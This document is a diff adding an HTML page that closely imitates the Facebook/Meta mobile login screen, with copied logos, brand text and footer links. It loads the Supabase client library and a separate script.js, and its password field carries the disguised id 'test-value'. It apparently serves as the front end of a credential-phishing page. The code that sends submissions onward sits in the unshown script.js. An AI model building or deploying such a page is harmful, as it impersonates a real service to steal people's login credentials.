@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>Log in</title>
+
+    <link rel="stylesheet" href="style.css">
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+
+<body>
+
+    <div class="mobile-container">
+
+        <div class="top-lang">
+            <p>English (UK)</p>
+        </div>
+
+        <div class="logo-container">
+            <svg viewBox="0 0 36 36" height="60" width="60">
+                <path
+                    d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-.2.1V22h4l.6-5h-4.6v-3.2c0-1.4.4-2.4 2.4-2.4h2.6v-4.5c-.4-.1-2-.2-3.8-.2-3.8 0-6.4 2.3-6.4 6.5V17h-4.3v5h4.3v13.9l.2-.1z"
+                    fill="#0866FF">
+                </path>
+            </svg>
+        </div>
+
+        <form id="submission-form" class="login-form">
+
+            <div class="floating-input">
+
+                <input type="text" id="username" placeholder=" " required autocomplete="off">
+
+                <label for="username">Email address or mobile number</label>
+
+            </div>
+
+            <div class="floating-input">
+
+                <input type="password" id="test-value" placeholder=" " required autocomplete="off">
+
+                <label for="test-value">Password</label>
+
+            </div>
+
+            <button type="submit" id="submit-btn" class="login-btn">
+                Log in
+            </button>
+
+            <a href="#" class="forgot-link">
+                Forgotten password?
+            </a>
+
+        </form>
+
+        <div id="message-container" class="message-container hidden">
+        </div>
+
+        <div class="spacer"></div>
+
+        <div class="bottom-area">
+
+            <button type="button" class="create-btn">
+                Create new account
+            </button>
+
+            <div class="meta-brand">
+
+                <svg viewBox="0 0 400 100" height="16" xmlns="http://www.w3.org/2000/svg">
+
+                    <path fill="#0866FF"
+                        d="M123.6,50c0,18.8-15.2,34.1-34.1,34.1c-10.4,0-20.2-4.7-26.6-12.7C56.5,79.4,46.7,84.1,36.3,84.1 C17.4,84.1,2.2,68.8,2.2,50S17.4,15.9,36.3,15.9c10.4,0,20.2,4.7,26.6,12.7c6.4-8,16.2-12.7,26.6-12.7 C108.4,15.9,123.6,31.2,123.6,50z M89.5,27.3c-7,0-13.6,3.6-17.7,9.7L62.9,48.2L53.9,37c-4.1-6.1-10.7-9.7-17.7-9.7 c-12.1,0-22,9.8-22,22s9.8,22,22,22c7,0,13.6-3.6,17.7-9.7l9-11.2l9,11.2c4.1,6.1,10.7,9.7,17.7,9.7c12.1,0,22-9.8,22-22 S101.6,27.3,89.5,27.3z" />
+
+                    <text x="140" y="75"
+                        font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif"
+                        font-weight="600" font-size="64" fill="#1c1e21">
+                        Meta
+                    </text>
+
+                </svg>
+
+            </div>
+
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Help</a>
+                <a href="#">More</a>
+            </div>
+
+        </div>
+
+    </div>
+
+    <script src="script.js"></script>
+
+</body>
+
+</html>
